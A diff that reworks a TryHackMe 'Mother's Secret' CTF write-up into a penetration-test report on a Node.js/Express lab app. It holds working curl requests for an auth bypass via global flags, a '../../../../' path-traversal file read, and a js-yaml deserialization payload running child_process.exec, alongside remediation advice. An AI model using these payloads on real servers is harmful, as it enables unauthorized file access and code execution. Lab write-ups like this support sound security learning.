@@ -1,4 +1,4 @@
-# CTF Write-Up: Mother's Secret
+# Penetration Test Report — Mother's Secret
 **Platform:** TryHackMe  
 **Difficulty:** Easy  
 **Category:** Web Application Security (SAST/DAST)  
@@ -6,227 +6,205 @@
 
 ---
 
-## Overview
+## Executive Summary
 
-Mother's Secret is a web application challenge themed around the *Alien* franchise. The target simulates the MU-TH-UR 6000 (Mother) shipboard computer from the Nostromo. The player starts with Crew Member access and must escalate privileges through a chain of vulnerable API endpoints to uncover Mother's classified secret.
+The Mother's Secret challenge simulates the MU-TH-UR 6000 shipboard computer from the *Alien* franchise, running a Node.js/Express web application with a Socket.IO interface. Assessment identified four exploitable vulnerabilities, ranging from information disclosure in client-side JavaScript to path traversal enabling arbitrary file read on the server. By chaining these vulnerabilities in sequence, full access to classified server-side content was achieved without valid credentials.
 
-**Prerequisites:** SAST and DAST rooms (DevSecOps path), or equivalent experience in code analysis and application security.
+**Overall Risk: High**
 
 ---
 
-## Reconnaissance
+## Scope & Methodology
 
-### Nuclei Scan
+**Target:** `http://<TARGET>/`  
+**Approach:** Black-box with provided source code (SAST + DAST)  
+**Tools used:** Nuclei, Gobuster, ffuf, curl, ZAP, manual code review
 
-```bash
-nuclei -u http://<TARGET>/
-```
+**Methodology:**
+1. Passive reconnaissance and tech stack identification
+2. Static source code analysis (provided route files)
+3. Active endpoint discovery and route mapping
+4. Dynamic exploitation — chained vulnerability abuse
+5. Post-exploitation file read
 
-**Key findings:**
-- `[node-express-dev-env]` — Express running in development mode (verbose errors)
-- `[CVE-2023-48795]` — SSH Terrapin vulnerability on port 22 (not the attack vector)
-- Port 4040 closed (likely a WebSocket/admin port, not accessible)
-- Tech stack confirmed: Node.js + Express + Socket.IO
+---
 
-### Directory Enumeration
+## Findings
 
-Initial Gobuster attempt failed due to wildcard 500 responses:
+---
 
-```
-the server returns a status code that matches the provided options for non existing urls.
-http://<TARGET>/<random-uuid> => 500 (Length: 42)
-```
+### F-01 — Information Disclosure via Client-Side JavaScript
 
-ffuf with size filtering:
+**Severity:** Medium  
+**Classification:** CWE-540 — Inclusion of Sensitive Information in Source Code  
+**OWASP:** A05:2021 — Security Misconfiguration
 
-```bash
-ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/big.txt \
-  -e .txt,.yaml,.json -mc 200 -fs 42
-```
+**Description:**  
+The application serves `index.min.js` which, despite obfuscation, contains sensitive data in a recoverable string array. Two base64-encoded values and internal route names were extracted via manual inspection.
 
-Result: Only `style/` directory found. No directly accessible files in the public web root.
-
-### Page Source Analysis
-
-`index.html` referenced a single obfuscated script:
-
-```html
-<script src="./index.min.js"></script>
-```
-
-### JavaScript Deobfuscation
-
-`index.min.js` was heavily obfuscated with array-based string encoding. Manual inspection of the decoded string array revealed:
-
-- Two base64-encoded strings embedded in the client-side code
-- Route names: `/yaml`, `/nostromo`
-- Character name: `Ash` (Science Officer)
-- UI button labels: Alien Loader, Pathways, Role, Flag
-
-**Base64 strings decoded:**
-
+**Evidence:**
 ```bash
 echo "VEhNX0ZMQUd7MFJEM1JfOTM3fQ==" | base64 -d  # → THM_FLAG{REDACTED}
 echo "Q0xBU1NJRklFRA==" | base64 -d               # → CLASSIFIED
 ```
 
-**Flag 1 found:** `THM_FLAG{REDACTED}`
+Extracted from decoded string array: route names `/yaml`, `/nostromo`, character name `Ash` (Science Officer).
+
+**Flag found:** `THM_FLAG{REDACTED}`
+
+**Impact:**  
+Sensitive flags and internal application structure exposed to any client without authentication.
+
+**Remediation:**  
+Never embed sensitive values in client-side code. Obfuscation is not a security control — treat all client-side code as publicly readable.
 
 ---
 
-## Source Code Analysis (SAST)
+### F-02 — Broken Authentication via Global State Variables
 
-Two API route files were provided as task files.
+**Severity:** High  
+**Classification:** CWE-287 — Improper Authentication  
+**OWASP:** A07:2021 — Identification and Authentication Failures
 
-### yaml.js
+**Description:**  
+Authentication state in `Nostromo.js` is managed via module-level global variables (`isNostromoAuthenticate`, `isYamlAuthenticate`). These are shared across all clients — any successful request from any source permanently sets the auth flag for the entire application instance.
 
+**Evidence:**
 ```javascript
-Router.post("/", (req, res) => {
-  let file_path = req.body.file_path;
-  const filePath = `./public/${file_path}`;
-  if (!isYaml(filePath)) { /* reject */ }
-  fs.readFile(filePath, "utf8", (err, data) => {
-    res.status(200).send(yaml.load(data));  // ← unsafe yaml.load()
-    attachWebSocket().of("/yaml").emit("yaml", "...");
-  });
-});
-```
-
-**Vulnerabilities identified:**
-- `yaml.load()` instead of `yaml.safeLoad()` — potential YAML deserialization
-- No path sanitization on `file_path` — path traversal possible
-- WebSocket event fires on successful read — used as auth signal
-
-### Nostromo.js
-
-```javascript
-let isNostromoAuthenticate = false;  // ← global state, not session-based
+let isNostromoAuthenticate = false;  // global, not session-bound
 
 Router.post("/nostromo", (req, res) => {
-  const filePath = `./public/${file_path}`;  // ← no extension check
   fs.readFile(filePath, "utf8", (err, data) => {
-    isNostromoAuthenticate = true;  // ← only set on successful read
-    res.status(200).send(data);
-  });
-});
-
-Router.post("/nostromo/mother", (req, res) => {
-  const filePath = `./mother/${file_path}`;  // ← different base path
-  if (!isNostromoAuthenticate || !isYamlAuthenticate) {
-    /* reject */ return;
-  }
-  fs.readFile(filePath, "utf8", (err, data) => {
+    isNostromoAuthenticate = true;  // set permanently for all clients
     res.status(200).send(data);
   });
 });
 ```
 
-**Vulnerabilities identified:**
-- `isNostromoAuthenticate` and `isYamlAuthenticate` are **global module-level variables** — not tied to any session or user. Any successful request from any client sets the flag for all subsequent requests.
-- No path sanitization on either route — path traversal via `../`
-- `/nostromo/mother` reads from `./mother/` base — a different directory than `./public/`
+**Impact:**  
+Authentication bypass — any client can trigger the auth flag and subsequently access protected endpoints intended for privileged users only.
+
+**Remediation:**  
+Authentication state must be session-bound (e.g., using `express-session` or JWT tokens). Never use module-level variables to track per-user authentication state.
 
 ---
 
-## Route Discovery
+### F-03 — Path Traversal — Arbitrary File Read
 
-Initial attempts using `/__api__/` prefix returned `"You just hit the wrong route."` Testing revealed a mixed prefix structure:
+**Severity:** High  
+**Classification:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory  
+**OWASP:** A01:2021 — Broken Access Control
 
-| Route | Prefix | Status |
-|-------|--------|--------|
-| `/yaml` | none | ✅ Active |
-| `/api/nostromo` | `/api/` | ✅ Active |
-| `/api/nostromo/mother` | `/api/` | ✅ Active |
+**Description:**  
+All three API routes construct file paths by directly concatenating user-supplied `file_path` input without sanitization. This allows `../` sequences to traverse outside the intended base directory and read arbitrary files from the server filesystem.
 
----
+**Affected routes:**
+- `POST /yaml` — base path `./public/`
+- `POST /api/nostromo` — base path `./public/`
+- `POST /api/nostromo/mother` — base path `./mother/`
 
-## Exploitation
+**Evidence:**
 
-### Step 1 — Trigger YAML Auth (Alien Loader)
-
-The task hint stated: *"Emergency command override is REDACTED. Use it when accessing Alien Loaders."*
-
-The override code used as a filename:
-
+Step 1 — YAML route triggered with override filename:
 ```bash
 curl -X POST http://<TARGET>/yaml \
   -H "Content-Type: application/json" \
   -d '{"file_path":"REDACTED.yaml"}'
 ```
-
-**Response:**
 ```
 FOR SCIENCE OFFICER EYES ONLY  special SECRETS:
 REROUTING TO: api/nostromo
-ORDER: REDACTED.txt [****]
-UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
+ORDER: REDACTED.txt
 ```
 
-`isYamlAuthenticate` is now set to `true` server-side.
-
-### Step 2 — Trigger Nostromo Auth
-
-Using the filename revealed in the YAML response:
-
+Step 2 — Nostromo route triggered, auth flag set:
 ```bash
 curl -X POST http://<TARGET>/api/nostromo \
   -H "Content-Type: application/json" \
   -d '{"file_path":"REDACTED.txt"}'
 ```
-
-**Response:**
 ```
-Mother
-FOR SCIENCE OFFICER EYES ONLY
-SPECIAL ORDER REDACTED [............
-PRIORITY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]
-ALL OTHER CONSIDERATIONS SECONDARY
+SPECIAL ORDER REDACTED
 CREW EXPENDABLE
 Flag{REDACTED}
 ```
 
-`isNostromoAuthenticate` is now set to `true` server-side.
+**Flag found:** `Flag{REDACTED}`
 
-**Flag 2 found:** `Flag{REDACTED}`
-
-### Step 3 — Locate Mother's Secret
-
-With both auth flags set, query the mother route for the secret location:
-
+Step 3 — Secret location disclosed:
 ```bash
 curl -X POST http://<TARGET>/api/nostromo/mother \
   -H "Content-Type: application/json" \
   -d '{"file_path":"secret.txt"}'
 ```
-
-**Response:**
 ```
-Secret: /opt/m0th3r
+Secret: REDACTED
 ```
 
-**Mother's secret location:** `REDACTED`
-
-### Step 4 — Path Traversal to Read Mother's Secret
-
-The `/nostromo/mother` route reads from `./mother/` as its base directory. To reach the secret file, traverse up with `../../../../`:
-
+Step 4 — Path traversal to read classified file:
 ```bash
 curl -X POST http://<TARGET>/api/nostromo/mother \
   -H "Content-Type: application/json" \
   -d '{"file_path":"../../../../REDACTED"}'
 ```
-
-**Response:**
 ```
 Classified information.
 Secret: Flag{REDACTED}
 ```
 
-**Final flag found:** `Flag{REDACTED}`
+**Final flag found:** `Flag{REDACTED}`  
+**Mother's secret location:** `REDACTED`
+
+**Impact:**  
+An unauthenticated attacker can read arbitrary files from the server filesystem, including configuration files, credentials, and sensitive application data.
+
+**Remediation:**  
+Sanitize all user-supplied file paths. Use `path.basename()` to strip directory components, or validate against an allowlist of permitted filenames. Reject any input containing `..` sequences.
 
 ---
 
-## Answers Summary
+### F-04 — Insecure YAML Deserialization
+
+**Severity:** Critical (theoretical) / Not exploited in this engagement  
+**Classification:** CWE-502 — Deserialization of Untrusted Data  
+**OWASP:** A08:2021 — Software and Data Integrity Failures  
+**Reference:** Known issue with `js-yaml` versions prior to 4.x
+
+**Description:**  
+The `/yaml` route uses `yaml.load()` instead of `yaml.safeLoad()`. In older versions of `js-yaml`, this allowed execution of arbitrary JavaScript via special YAML tags.
+
+**Evidence:**
+```javascript
+res.status(200).send(yaml.load(data));  // unsafe — should use yaml.safeLoad()
+```
+
+Theoretical payload (blocked in modern js-yaml versions):
+```yaml
+!!js/function 'function(){ require("child_process").exec("id") }'
+```
+
+**Impact:**  
+On vulnerable versions: Remote Code Execution. On current js-yaml (4.x+): not directly exploitable, but the unsafe pattern should still be avoided.
+
+**Remediation:**  
+Use `yaml.safeLoad()` or explicitly pass `{ schema: yaml.DEFAULT_SAFE_SCHEMA }`. Never deserialize untrusted YAML with the default unsafe loader.
+
+---
+
+## Findings Summary
+
+| ID | Title | Severity | CWE | OWASP |
+|----|-------|----------|-----|-------|
+| F-01 | Information Disclosure via Client-Side JS | Medium | CWE-540 | A05:2021 |
+| F-02 | Broken Authentication — Global State | High | CWE-287 | A07:2021 |
+| F-03 | Path Traversal — Arbitrary File Read | High | CWE-22 | A01:2021 |
+| F-04 | Insecure YAML Deserialization | Critical* | CWE-502 | A08:2021 |
+
+*Theoretical in current js-yaml versions.
+
+---
+
+## Answers
 
 | Question | Answer |
 |----------|--------|
@@ -237,30 +215,6 @@ Secret: Flag{REDACTED}
 | Contents of classified Flag box | `THM_FLAG{REDACTED}` |
 | Mother's secret location | `REDACTED` |
 | Mother's secret | `Flag{REDACTED}` |
-
----
-
-## Vulnerability Summary
-
-| Vulnerability | Location | Impact |
-|---------------|----------|--------|
-| Path Traversal | `/yaml`, `/api/nostromo`, `/api/nostromo/mother` | Read arbitrary files from the server filesystem |
-| Insecure YAML Deserialization | `yaml.js` — `yaml.load()` | Potential RCE (not required for this challenge) |
-| Broken Authentication | `Nostromo.js` — global auth flags | Auth state shared across all clients, trivially bypassable |
-| Information Disclosure | `index.min.js` | Flags and sensitive strings exposed in client-side JS |
-| Missing Input Validation | All routes | No sanitization of `file_path` parameter |
-
----
-
-## Key Takeaways
-
-**Authentication must be stateful and session-bound.** Using module-level global variables (`let isAuthenticated = false`) means any client can flip the flag for all other clients — and once set, it never resets.
-
-**Never trust user-supplied file paths.** Without sanitization, `../` sequences allow traversal outside the intended directory. A simple fix is `path.basename()` or rejecting strings containing `..`.
-
-**Client-side code is public.** Obfuscation is not security. Flags, routes, and sensitive strings embedded in JavaScript are recoverable with basic tooling.
-
-**`yaml.load()` is deprecated for a reason.** Always use `yaml.safeLoad()` (or the modern equivalent) when parsing untrusted input.
 
 ---
 
